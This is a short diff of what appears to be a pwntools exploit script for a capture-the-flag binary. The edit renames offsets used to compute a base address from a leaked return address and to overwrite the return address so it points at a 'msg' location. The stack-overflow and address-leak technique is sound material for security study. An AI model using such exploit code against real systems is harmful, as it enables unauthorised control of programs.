@@ -49,13 +49,16 @@ r.recvuntil(b'name? ')
 r.send(payloads)
 
 z = r.recvline()
-return_address = (u64(z.split(b'A'*40)[1][:-1].ljust(8, b'\x00')))
+return_address = u64(z.split(b'A'*40)[1][:-1].ljust(8, b'\x00'))
 
 # main() to task() is 160 bytes
-offset = 0x8ae4 - 0x8a44
+main_offset = 0x8a44
+task_offset = 0x8ae4
+msg_offset = 0xd31e0
+offset = task_offset - main_offset
 
-base_addr = return_address - offset - 0x8a44 # main is at 0x8a44
-msg_addr = base_addr + 0xd31e0 # msg is at 0xd31e0
+base_addr = return_address - offset - main_offset
+msg_addr = base_addr + msg_offset
 
 new_return_address = p64(msg_addr)
 
